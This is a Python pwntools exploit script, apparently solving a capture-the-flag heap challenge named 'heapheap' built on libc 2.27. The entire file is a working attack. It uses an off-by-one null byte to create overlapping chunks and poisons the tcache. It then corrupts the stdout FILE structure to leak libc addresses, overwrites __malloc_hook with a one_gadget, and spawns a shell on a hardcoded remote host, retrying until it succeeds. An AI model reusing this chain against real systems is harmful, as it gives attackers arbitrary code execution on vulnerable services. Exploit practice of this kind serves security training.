#!usr/bin/env python
# coding=utf-8
from pwn import *
elf = ELF("./heapheap")
libc = ELF("./libc-2.27.so")
def debug():
    gdb.attach(p, "b main")
# gdb.attach(p, "b *$rebase(0x)")

def add(size, content):
    p.sendlineafter("Please input your choice: ", '1')
    p.recvuntil("Please input the size:")
    p.sendline(str(size))
    p.recvuntil("Data:")
    p.send(content)


def free(idx):
    p.sendlineafter("Please input your choice: ", '2')
    p.recvuntil("Please input the index:")
    p.sendline(str(idx))


def attack():
    add(0x4f8, 'a')  # 0
    add(0xf8, 'a')  # 1
    add(0xf8, 'a')  # 2
    add(0xf8, 'a')  # 3
    free(2)
    add(0xf8, 'a' * 0xf0 + p64(0x700))  # 2
    for i in range(6):
        add(0xf8, 'a')
    for i in range(4, 10):
        free(i)
    free(1)
    free(0)
    free(3)
    add(0x4f8, 'a')  # 0
    add(0x28, p16(0xa760))  # 1
    add(0xf8, 'a')  # 3
    add(0xf8, p64(0xfbad1800) + p64(0) * 3 + '\x00')  # 4
    libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3ed8b0
    log.info("libc_base==>0x%x" % libc_base)
    mlh = libc_base + libc.sym['__malloc_hook']
    sys = libc_base + libc.sym['system']
    ogg = libc_base + 0x10a41c

    free(2)
    add(0x1f8, 'a' * 0xc8 + p64(0x101) + p64(mlh))  # 2
    add(0xf8, 'a')  # 5
    add(0xf8, p64(ogg))  # 6
    p.sendlineafter("Please input your choice: ", '1')
    p.recvuntil("Please input the size:")
    p.sendline(str(0x58))


while True:
    try:
        # p = process(argv=[ld.path,elf.path], env={"LD_PRELOAD" : libc.path})
        p = remote("123.57.69.203", 5320)
        attack()
        p.sendline("cat flag.txt")
        p.interactive()
        break
    except:
        p.close()

